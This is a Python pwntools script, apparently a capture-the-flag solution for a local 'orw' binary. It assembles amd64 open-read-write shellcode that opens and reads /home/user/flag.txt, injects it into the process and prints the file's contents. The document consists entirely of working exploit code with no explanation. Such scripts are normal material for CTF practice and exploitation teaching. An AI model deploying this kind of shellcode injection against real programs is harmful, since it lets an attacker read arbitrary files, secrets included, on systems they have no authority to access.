from pwn import *

exe = ELF("./orw", checksec=False)
p = process(exe.path)

context.arch = 'amd64'

shellcode = asm(
    """
    mov rbx, 0x0000000000747874     #txt
    push rbx
    mov rbx, 0x2e67616c662f7265   #.galf/re
    push rbx
    mov rbx, 0x73752f656d6f682f   #su/emoh/
    push rbx
     
    mov rdi, rsp                  #rdi = /home/user/flag.txt
    xor rsi, rsi                  #rsi = 0
    xor rdx, rdx                  #rdx = 0
    mov rax, 2                    # syscall: open
    syscall

    mov rdi, rax                  # rdi = fd
    mov rsi, rsp                  # rsi = buffer
    mov rdx, 0x100                # rdx = length
    xor rax, rax                  # syscall: read (rax = 0)
    syscall

    mov rdi, 1                    # rdi = stdout
    mov rax, 1                    # syscall: write
    syscall
    """, arch='amd64'
)

p.sendlineafter(':', shellcode)
output = p.recvall().decode(errors="ignore")
print(output)